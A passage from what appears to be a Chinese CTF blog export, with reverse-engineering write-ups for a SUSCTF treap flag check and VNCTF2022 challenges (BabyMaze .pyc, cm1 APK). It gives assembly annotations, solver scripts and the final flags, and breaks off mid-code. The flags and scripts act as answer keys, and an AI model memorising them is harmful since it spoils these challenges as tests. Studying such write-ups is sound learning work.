rcxmovsxd rcx, dword ptr ds:[rcx]imul rcx, rcx, 0x1Clea rdx, ds:[0x00000001400073C0]mov dword ptr ds:[rdx+rcx*1+0x18], eax # 把加密后的那个Input放到那个内存位置，像是一个结构体 ##### 暂时不知道这一段是啥意思 (乘 0xbc8f) % 0x7FFFFFFF 谷歌搜到 # https://rvklein.me/proj/rando/rando-code.htmlmovsxd rax, dword ptr ds:[0x00000001400062C0] # 0x00000001400062C0的初始值是 0x1DF2ED66 # 本条指令地址是000000014001ABCC imul rax, rax, 0xBC8F #0000185591BAFD68mov ecx, 0x7FFFFFFF idiv rcx # 第二轮 RAX: 00000000000030AB RDX 0000000011BB2E13(余数) 这里是生成优先级，使其二叉搜索树满足堆的性质mov rax, rdx mov dword ptr ds:[0x00000001400062C0], eax mov eax, dword ptr ds:[0x00000001400062C0]#####movsxd rcx, dword ptr ds:[0x00000001400073B4]lea rdx, ds:[0x0000000140007220]mov dword ptr ds:[rdx+rcx*4], eax # 000000002109B018movsxd rax, dword ptr ds:[0x00000001400073B4]lea rcx, ds:[0x0000000140007220]mov rdx, qword ptr ss:[rsp+0x30] # 00000001400073B0 给 rdx movsxd rdx, dword ptr ds:[rdx]imul rdx, rdx, 0x1Clea r8, ds:[0x00000001400073C0]mov eax, dword ptr ds:[rcx+rax*4] mov dword ptr ds:[r8+rdx*1+0x10], eax # 000000002109B018mov eax, dword ptr ds:[0x00000001400073B4]inc eaxmov dword ptr ds:[0x00000001400073B4], eaxadd rsp, 0x28mov eax, dword ptr ss:[rsp+0x24] # 一轮循环结束inc eax mov dword ptr ss:[rsp+0x24], eax cmp dword ptr ss:[rsp+0x24], 0x20 # 回到了最上面的初始位置XXXX 地址：00000001400158B8#****************************************************这是不跳的情况****************************************************mov rax, qword ptr ss:[rsp+0x30] # 00000001400073B0 # 地址是0000000140012B60movsxd rax, dword ptr ds:[rax]imul rax, rax, 0x1C lea rcx, ds:[0x00000001400073C0] mov eax, dword ptr ds:[rcx+rax*1+0xC]inc eaxmov rcx, qword ptr ss:[rsp+0x30]movsxd rcx, dword ptr ds:[rcx] # 00000001400073B0imul rcx, rcx, 0x1Clea rdx, ds:[0x00000001400073C0]mov dword ptr ds:[rdx+rcx*1+0xC], eax # 变为了2mov rax, qword ptr ss:[rsp+0x30] # 00000001400073B0movsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0]mov edx, dword ptr ss:[rsp+0x38] # 取出enc_input cmp dword ptr ds:[rcx+rax*1+0x8], edxje 0x0000000140011E04 mov rax, qword ptr ss:[rsp+0x30]movsxd rax, dword ptr ds:[rax]imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0]mov eax, dword ptr ds:[rcx+rax*1+0x8] # 取出enc_inputcmp dword ptr ss:[rsp+0x38], eaxjg 0x0000000140017AF8mov rax, qword ptr ss:[rsp+0x30] # 00000001400073B0movsxd rax, dword ptr ds:[rax]imul rax, rax, 0x1C lea rcx, ds:[0x00000001400073C0]add rcx, raxmov rax, rcxmov edx, dword ptr ss:[rsp+0x38]mov rcx, raxmov dword ptr ss:[rsp+0x10], edxmov qword ptr ss:[rsp+0x8], rcx sub rsp, 0x28mov rax, qword ptr ss:[rsp+0x30] #00000001400073DCcmp dword ptr ds:[rax], 0x0je ****mov eax, dword ptr ds:[0x00000001400073B8]inc eax mov dword ptr ds:[0x00000001400073B8], eax 经过无尽的调试（在判断插入节点个数那里下断点，每插入一个节点，就把0x00000001400073B0那里的数据提取出来，进行比对）就会发现，程序是把输入的flag按照Treap的特性存放在了00000001400073C0处，这里是一个长度为33的结构体数组，(第一个数组全是0，因为序号是从1开始的，序号是0表示为空，有效的就是后面32个数组)每个单元的大小是0X1C 123456789struct tree_node&#123; 0x00 DWORD 左孩子; //0表示空 0x04 DWORD 右孩子; 0X08 DWORD enc_input; //加密后的每一个字符 0X0C DWORD 叶子个数; //假设把此节点当做根节点，整个Tree的叶子个数 0X10 DWORD 随机数; //优先级 0X14 DWORD 1; //这个没搞懂啥意思 0X18 DWORD input; //输入的flag的每一个字符&#125; 在00000001400073B0处存放着根节点，00000001400073B4, 00000001400073B8处存着当前树的所有叶子个数 输入SUSCTF&#123;01234567890122345679abcdefghijkl&#125;, 然后根据00000001400073C0处的数据画出自己输入的假的flag构造的二叉树 提取出00000001400073C0处有效的32个数组 123456789101112131415161718192021222324252627282930313200000000 00000013 000000F1 00000006 2109B018 00000001 000000300000000F 00000009 000000D9 00000018 11BB2E13 00000001 0000003100000000 00000000 000000F7 00000001 5D64CABB 00000001 0000003200000000 0000000B 0000009A 00000002 302F1C09 00000001 0000003300000004 00000015 000000AF 00000020 02E78C02 00000001 0000003400000000 00000000 000000B4 00000001 2A28B165 00000001 0000003500000000 00000000 000000BB 00000001 6F018185 00000001 0000003600000000 00000006 000000B1 00000002 1CF5A8D1 00000001 0000003700000016 00000011 000000EE 0000000E 1532F368 00000001 0000003800000000 00000000 000000F4 00000001 42367652 00000001 0000003900000000 00000000 000000A0 00000001 7B50B157 00000001 0000003000000007 00000000 000000C2 00000002 244FA941 00000001 0000003100000000 00000000 000000D7 00000001 48CB7CCC 00000001 000000320000000C 00000014 000000CF 00000004 1950F130 00000001 0000003200000008 00000012 000000B6 00000009 15561F1B 00000001 0000003300000000 0000000A 000000F3 00000002 29F35383 00000001 0000003400000001 00000020 00000101 0000000A 204017F9 00000001 000000350000000E 0000000D 000000D5 00000006 15686F99 00000001 0000003600000010 0000001A 000000F6 00000005 274AD200 00000001 0000003700000000 00000000 000000D3 00000001 650387E1 00000001 000000390000001B 00000019 00000130 0000001D 04C2B77D 00000001 0000006100000017 00000000 000000E7 00000003 278451D6 00000001 0000006200000000 00000018 000000DE 00000002 3F0318C0 00000001 0000006300000000 00000000 000000E3 00000001 78E83012 00000001 0000006400000000 0000001D 0000013D 00000002 0D00C42A 00000001 0000006500000003 00000000 000000FD 00000002 537C7E9D 00000001 0000006600000002 0000001E 0000012A 0000001A 0F8680AF 00000001 0000006700000000 00000000 00000103 00000001 72A27C9F 00000001 0000006800000000 00000000 0000014D 00000001 5C4909AF 00000001 0000006900000000 00000000 0000012C 00000001 2FE974B3 00000001 0000006A00000000 00000000 00000125 00000001 351BEA91 00000001 0000006B0000001C 0000001F 00000123 00000003 2ADAD13B 00000001 0000006C 一点点调试就会发现这采用了后序遍历的方式去遍历这个二叉树， 1234567......0000000140010DE3 | 48:6305 D265FFFF | movsxd rax,dword ptr ds:[0x1400073BC] | 0x00000001400073BC 是比对字符的个数，估计到了32的时候就是成功的位置000000014001C1ED | 48:8D0D 4C9EFEFF | lea rcx,qword ptr ds:[0x140006040] | 140006040存放着后续遍历的真正的数据，需要找到索引才能还原 ......0000000140014ED1 | 394424 2C | cmp dword ptr ss:[rsp+0x2C],eax | 最终比较 ...... 将140006040处的数据提取出来，构造二叉树 12encs = [0x00A2, 0x00AF, 0x009D, 0x00B7, 0x00D2, 0x00CB, 0x00C7, 0x00C6, 0x00B0, 0x00D5, 0x00DA, 0x00E3, 0x00E6, 0x00E8, 0x00E9, 0x00F3, 0x00F4, 0x00EF, 0x00EE, 0x00F7, 0x00F9, 0x00FF, 0x0101, 0x00F5, 0x0109, 0x011F, 0x011A, 0x0146, 0x0124, 0x010F, 0x0106, 0x00DF] flag—&gt;加密–&gt;按照顺序插入–&gt;得到了这个二叉树，因此咱们现在只需要知道现在这个二叉树每个节点的索引，然后解密就可以得到原始的flag 在调试的过程中发现，如果当前比较的这个节点不是叶子节点的话，会对本节点和左孩子节点 ，本节点和右孩子节点 的关系进行验证 12345# 比较的汇编代码在这000000014001B7B0 | 48:3914C1 | cmp qword ptr ds:[rcx+rax*8],rdx | 比较右孩子 ......0000000140015993 | 48:3914C1 | cmp qword ptr ds:[rcx+rax*8],rdx | 左孩子比较 ...... 这就是我们的突破口 00000001400060C0 存放着本节点和左孩子节点的关系 00000001400061C0 存放着本节点和右孩子之间的关系 这2个数据怎么用呢？调试发现是 孩子节点序号 *0X17 + 本节点input = 关系s[本节点序号] 因此我们要得到孩子节点序号的话，需要知道本节点的Input + 本节点的序号，然后用本节点序号去索引左孩子或右孩子关系s， 1234567def get_child_xuhao(node_c, gx): # node_c： 本节点字符 # gx: 关系 # 孩子节点序号 * 0x17 + 本节点input = gx if (gx - node_c) % 0x17 == 0: return int((gx - node_c) / 0x17) return None 因为Treap有堆的性质，根节点的优先级是最小的，因此我们提取出所有的优先级，对他进行排序 123456789101112c = [0x2109B018, 0x11BB2E13, 0x5D64CABB, 0x302F1C09, 0x02E78C02, 0x2A28B165, 0x6F018185, 0x1CF5A8D1, 0x1532F368, 0x42367652, 0x7B50B157, 0x244FA941, 0x48CB7CCC, 0x1950F130, 0x15561F1B, 0x29F35383, 0x204017F9, 0x15686F99, 0x274AD200, 0x650387E1, 0x04C2B77D, 0x278451D6, 0x3F0318C0, 0x78E83012, 0x0D00C42A, 0x537C7E9D, 0x0F8680AF, 0x72A27C9F, 0x5C4909AF, 0x2FE974B3, 0x351BEA91, 0x2ADAD13B]yxj = [[i, c[i]] for i in range(len(c))]def sort_(elem): return elem[1]yxj.sort(key=sort_)print(yxj)# [[4, 48729090], [20, 79869821], [24, 218154026], [26, 260473007], [1, 297479699], [8, 355660648], [14, 357965595], [17, 359165849], [13, 424735024], [7, 485861585], [16, 541071353], [0, 554283032], [11, 609200449], [18, 659214848], [21, 662983126], [15, 703812483], [5, 707309925], [31, 718983483], [29, 803828915], [3, 808393737], [30, 891021969], [22, 1057167552], [9, 1110865490], [12, 1221295308], [25, 1400667805], [28, 1548290479], [2, 1566886587], [19, 1694730209], [6, 1862369669], [27, 1923251359], [23, 2028482578], [10, 2068885847]] 可以发现，索引是4，即序号是5的时候最小，即223的序号是5，根据5(序号)和223(enc_input)进行解密就可以得到本节点字符 ‘d’ 1234567def get_real_c(_index, enc_input): # 通过索引和enc_input得到原始input tmp = enc_input - 97 - key[_index] - _index return tmpget_real_c(4, 223)# 100 --&gt;chr(100) = &#x27;d&#x27; 然后写脚本递归就可以得到所有节点的字符 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# [本节点，左孩子，右孩子，序号，flag]# 构造二叉树treap = [ [223, 218, 262, 5, 100], [218, 213, 0, 0, 0], [213, 176, 0, 0, 0], [176, 157, 198, 0, 0], [157, 0, 175, 0, 0], [175, 162, 0, 0, 0], [198, 183, 199, 0, 0], [162, 0, 0, 0, 0], [183, 0, 0, 0, 0], [199, 0, 203, 0, 0], [203, 0, 210, 0, 0], [210, 0, 0, 0, 0], [262, 245, 271, 0, 0], [245, 238, 257, 0, 0], [238, 233, 239, 0, 0], [233, 232, 0, 0, 0], [232, 230, 0, 0, 0], [230, 227, 0, 0, 0], [227, 0, 0, 0, 0], [239, 0, 244, 0, 0], [244, 243, 0, 0, 0], [243, 0, 0, 0, 0], [257, 255, 0, 0, 0], [255, 249, 0, 0, 0], [249, 247, 0, 0, 0], [247, 0, 0, 0, 0], [271, 265, 292, 0, 0], [265, 0, 0, 0, 0], [292, 282, 326, 0, 0], [282, 0, 287, 0, 0], [326, 0, 0, 0, 0], [287, 0, 0, 0, 0]]treap_dict = &#123;&#125;for i in range(32): treap_dict[treap[i][0]] = treap[i][1:5]key = [0x60, 0x46, 0x62, 0x03, 0x16, 0x19, 0x1E, 0x12, 0x4D, 0x51, 0x05, 0x25, 0x38, 0x2F, 0x14, 0x4F, 0x5B, 0x2D, 0x4C, 0x26, 0x5A, 0x0F, 0x04, 0x07, 0x5F, 0x1D, 0x48, 0x1F, 0x67, 0x44, 0x3B, 0x37]encs = [0x00A2, 0x00AF, 0x009D, 0x00B7, 0x00D2, 0x00CB, 0x00C7, 0x00C6, 0x00B0, 0x00D5, 0x00DA, 0x00E3, 0x00E6, 0x00E8, 0x00E9, 0x00F3, 0x00F4, 0x00EF, 0x00EE, 0x00F7, 0x00F9, 0x00FF, 0x0101, 0x00F5, 0x0109, 0x011F, 0x011A, 0x0146, 0x0124, 0x010F, 0x0106, 0x00DF]# 节点和右孩子之间的关系gxs_right = [0x00AC, 0x00FD, 0x0247, 0x0115, 0x00D4, 0x02B5, 0x01FC, 0x028B, 0x014A, 0x004C, 0x008E, 0x00E9, 0x0055, 0x012C, 0x00F5, 0x00E3, 0x0081, 0x02E2, 0x01A8, 0x0117, 0x0152, 0x0101, 0x003A, 0x01D0, 0x00A8, 0x00CC, 0x0149, 0x0137, 0x0300, 0x01EC, 0x0276, 0x0247]# 节点和左孩子之间的关系gxs_left = [0x00A8, 0x0131, 0x0113, 0x0047, 0x009E, 0x003B, 0x003A, 0x00BF, 0x0092, 0x00F0, 0x0174, 0x00C3, 0x0289, 0x0104, 0x0260, 0x004D, 0x02FB, 0x009E, 0x0191, 0x0158, 0x007D, 0x004A, 0x01E9, 0x0101, 0x00D0, 0x00FC, 0x0070, 0x011F, 0x0345, 0x0162, 0x02A4, 0x0092]def get_child_xuhao(node_c, gx): # node_c： 本节点字符 # gx: 关系 # 孩子节点序号 * 0x17 + 本节点input = gx if (gx - node_c) % 0x17 == 0: return int((gx - node_c) / 0x17) return Nonedef get_real_c(_index, enc_input): # 通过索引和enc_input得到原始input tmp = enc_input - 97 - key[_index] - _index return tmpdef treap_traverse(_root): if _root == 0: return node_c = get_real_c(treap_dict[_root][2] - 1, _root) idx = encs.index(_root) # 得到后续遍历后的数组中_root的索引 # 如果左节点不为空，更新左节点的数据 left_root = treap_dict[_root][0] right_root = treap_dict[_root][1] if left_root != 0: left_xh = get_child_xuhao(node_c, gxs_left[idx]) left_c = get_real_c(left_xh - 1, treap_dict[_root][0]) # 左孩子 treap_dict[left_root][2] = left_xh treap_dict[left_root][3] = left_c treap_traverse(left_root) if right_root != 0: right_xh = get_child_xuhao(node_c, gxs_right[idx]) right_c = get_real_c(right_xh - 1, treap_dict[_root][1]) # 右孩子 treap_dict[right_root][2] = right_xh treap_dict[right_root][3] = right_c treap_traverse(right_root)treap_traverse(223)flag = []for _key, value in treap_dict.items(): flag.append([value[2], value[3]])flag.sort()flag = [x[1] for x in flag]print(&quot;SUSCTF&#123;&quot; + &quot;&quot;.join(map(chr, flag)) + &quot;&#125;&quot;)# SUSCTF&#123;8226d8a68d25d8f03be17c4d7027b29c&#125; flag为：SUSCTF{8226d8a68d25d8f03be17c4d7027b29c}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://zzzzsky.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"VNCTF2022_RE_复盘","slug":"VNCTF2022_RE_WP","date":"2022-02-23T09:03:00.000Z","updated":"2022-02-23T09:05:54.827Z","comments":true,"path":"2022/02/23/VNCTF2022_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/02/23/VNCTF2022_RE_WP/","excerpt":"","text":"VNCTF2022_RE_复盘1.BabyMaze题目给出一个 BabyMaze.pyc 文件，尝试用uncompyle6反编译，但是失败 ，于是用脚本反汇编 1234567891011121314151617181920212223242526# 安装环境import disimport marshalimport sysheader_sizes = [ # (size, first version this applies to) # pyc files were introduced in 0.9.2 way, way back in June 1991. (8, (0, 9, 2)), # 2 bytes magic number, \\r\\n, 4 bytes UNIX timestamp (12, (3, 6)), # added 4 bytes file size # bytes 4-8 are flags, meaning of 9-16 depends on what flags are set # bit 0 not set: 9-12 timestamp, 13-16 file size # bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0) (16, (3, 7)), # inserted 4 bytes bit flag field at 4-8 # future version may add more bytes still, at which point we can extend # this table. It is correct for Python versions up to 3.9]header_size = next(s for s, v in reversed( header_sizes) if sys.version_info &gt;= v)with open(&#x27;BabyMaze.pyc&#x27;, &quot;rb&quot;) as f: metadata = f.read(header_size) # first header_size bytes are metadata code = marshal.load(f) # rest is a marshalled code objecta = dis.dis(code)print(len(code.co_code)) 1234567891011121314151617181920212223242526272829303132331 0 JUMP_ABSOLUTE 4 &gt;&gt; 2 JUMP_ABSOLUTE 6 &gt;&gt; 4 JUMP_ABSOLUTE 2 &gt;&gt; 6 LOAD_CONST 0 (1) 8 LOAD_CONST 0 (1) 10 LOAD_CONST 0 (1) 12 LOAD_CONST 0 (1) 14 LOAD_CONST 0 (1) 16 LOAD_CONST 0 (1) 18 LOAD_CONST 0 (1) 20 LOAD_CONST 0 (1) 22 LOAD_CONST 0 (1) 24 LOAD_CONST 0 (1) 26 LOAD_CONST 0 (1) 28 LOAD_CONST 0 (1) 30 LOAD_CONST 0 (1) 32 LOAD_CONST 0 (1) 34 LOAD_CONST 0 (1) 36 LOAD_CONST 0 (1) 38 LOAD_CONST 0 (1) 40 LOAD_CONST 0 (1) 42 LOAD_CONST 0 (1) 44 LOAD_CONST 0 (1) 46 LOAD_CONST 0 (1) 48 LOAD_CONST 0 (1) 50 LOAD_CONST 0 (1) .......... 42 LOAD_CONST 5 (&quot;Sorry, we won&#x27;t acknowledge the existence of your squad.&quot;) 44 CALL_FUNCTION 1 46 POP_TOP &gt;&gt; 48 LOAD_CONST 0 (None) 50 RETURN_VALUE 2030(0X7EE) 可以发现开头是3个指令的跳转，是这个地方干扰了uncompyle6，于是打开opcode.h，找对应的机器码 是113（0X71) 将其删除，并且将 7EE 改为 7E8,然后重新反编译 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# uncompyle6 version 3.7.4# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: .\\BabyMaze.py# Compiled at: 2022-02-08 15:12:27# Size of source mod 2**32: 3707 bytes_map = [ [ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [1, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1], [1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1], [1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1], [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1], [1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1], [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1], [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 7, 1], [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]def maze(): x = 1 y = 1 step = input() for i in range(len(step)): if step[i] == &#x27;w&#x27;: x -= 1 else: if step[i] == &#x27;s&#x27;: x += 1 else: if step[i] == &#x27;a&#x27;: y -= 1 else: if step[i] == &#x27;d&#x27;: y += 1 else: return False if _map[x][y] == 1: return False if x == 29 and y == 29: return Truedef main(): print(&#x27;Welcome To VNCTF2022!!!&#x27;) print(&#x27;Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)&#x27;) print(&#x27;you are still doing the mission alone, this tape will self-destruct in five seconds.&#x27;) if maze(): print(&#x27;Congratulation! flag: VNCTF&#123;md5(your input)&#125;&#x27;) else: print(&quot;Sorry, we won&#x27;t acknowledge the existence of your squad.&quot;)if __name__ == &#x27;__main__&#x27;: main()# okay decompiling BabyMaze.pyc 发现是31 * 31的迷宫 稍作整理，DFS解密即可, 解密脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141# 题目：给定大小为n*m的矩阵，求S到G的最短路径并输出# 输入：# 10 10# #S######.## ......#..## .#.##.##.## .#........# ##.##.##### ....#....## .#######.## ....#.....# .####.###.# ....#...G## 输出：# 迷宫路径import queueimport hashlibMAX_VALUE = float(&#x27;inf&#x27;)class Point: def __init__(self, x=0, y=0): self.x = x self.y = ydef bfs(maze, begin, end): path = [] # 保存经过的每一个点 n, m = len(maze), len(maze[0]) dist = [[MAX_VALUE for _ in range(m)] for _ in range(n)] pre = [[None for _ in range(m)] for _ in range(n)] # 当前点的上一个点,用于输出路径轨迹 nx = [[1, 0], [-1, 0], [0, -1], [0, 1]] sx, sy = begin.x, begin.y gx, gy = end.x, end.y dist[sx][sy] = 0 q = queue.Queue() q.put(begin) while q: point = q.get() if point.x == gx and point.y == gy: break for i in range(4): dx, dy = point.x + nx[i][0], point.y + nx[i][1] if 0 &lt;= dx &lt; n and 0 &lt;= dy &lt; m and maze[dx][dy] != &#x27;#&#x27; and dist[dx][dy] == MAX_VALUE: dist[dx][dy] = dist[point.x][point.y] + 1 pre[dx][dy] = point q.put(Point(dx, dy)) stack = [] curr = end while True: stack.append(curr) if curr.x == begin.x and curr.y == begin.y: break prev = pre[curr.x][curr.y] curr = prev while stack: curr = stack.pop() # print(&#x27;(%d, %d)&#x27; % (curr.x, curr.y)) path.append((curr.x, curr.y)) return pathdef get_path(path): # 将路径的点打印为路径 sss = &quot;&quot; for i in range(1, len(path)): x = path[i-1] # 前面的 y = path[i] # 后面的 if x[0] == y[0]: # 横坐标相同，左右移动，即a或d if x[1] &gt; y[1]: sss += &quot;a&quot; else: sss += &quot;d&quot; else: # 纵坐标相同 if x[0] &gt; y[0]: sss += &quot;w&quot; else: sss += &quot;s&quot; # print(sss) return sssif __name__ == &#x27;__main__&#x27;: n, m = map(int, input().split()) maze = [[&#x27;&#x27; for _ in range(m)] for _ in range(n)] begin = Point() end = Point() for i in range(n): s = input() maze[i] = list(s) if &#x27;S&#x27; in s: begin.x = i begin.y = s.index(&#x27;S&#x27;) if &#x27;G&#x27; in s: end.x = i end.y = s.index(&#x27;G&#x27;) _path = bfs(maze, begin, end) path = get_path(_path) print(path) print(hashlib.md5(path.encode()).hexdigest())# 31 31# ################################ #S#.................#.........## #.#.#########.#####.#.#######.## #.#...#.......#...#...#.#...#.## #.#####.#########.#####.#.#.#.## #...#...#.............#...#...## ###.#.###.#############.######## #...#.#...#.........#...#...#.## #.###.#.###.#######.#.###.#.#.## #.....#.#...#...#.#.#...#.#...## #######.#.###.#.#.#.###.#.###.## #.......#.....#...#.#...#.#...## #.###############.#.#.###.#.#### #.......#.......#.#...#...#...## #.#####.#.#.#.###.#####.######## #.#...#.#.#.#.#...#...........## #.#.#.#.#.#.###.###.#####.###.## #.#.#.#.#.#...#...#.#...#.#...## #.#.###.#.###.###.#.#.#.###.#### #...#...#.#.....#.#.#.#...#...## #.###.#.#.#.#####.#.#.###.#.#.## #.#...#.#.#.......#.#.#.#.#.#.## #.#.###.#.###########.#.#.#.#.## #.#...#.#.#.........#.#.#.#.#.## #.###.#.#.#####.#.#.#.#.#.#.#.## #...#.#.#.....#.#.#...#...#.#.## #####.#######.###.#######.###.## #.....#.....#...#.......#.....## #.#####.###.###.#######.#####.## #.........#.............#....G## ################################ ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss# 801f190737434100e7d2790bd5b0732e 关于python字节码的反汇编，可以看这个文章学习 https://song-10.gitee.io/2020/04/20/Reverse-2020-04-20-python-byte/ 2.cm1是个APK文件，拖入JEB进行分析 发现关键check函数放在了解密后的ooo文件中，进入copyFiles函数观察如何解密的 是以1024为1组，异或vn2022，写脚本解密 1234567with open(&quot;ooo&quot;, &quot;rb&quot;) as f: content = list(f.read())key = b&quot;vn2022&quot;for i in range(len(content)): content[i] ^= key[(i % 1024) % 6]with open(&quot;oooo&quot;, &quot;wb&quot;) as f: f.write(bytes(content)) 然后用jadx打开opoo，找到hcheck 是xxtea加密，写脚本解密即可 123In [18]: a = b&quot;H4pPY_VNCTF!!OvO&quot;In [19]: struct.unpack(&quot;&lt;IIII&quot;, a)Out[19]: (1349530696, 1314283353, 558257219, 1333153569) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;void encrypt(unsigned int * v, int n, unsigned int * key) &#123; unsigned int rounds = (52 / n) + 6; unsigned int sum = 0, y = 0; unsigned int z = v[n - 1]; unsigned int p; while (rounds &gt; 0) &#123; sum -= 1640531527; unsigned int e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; v[p] += ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))); z = v[p]; &#125; y = v[0]; v[n - 1] += ((((z &gt;&gt; 5) ^ 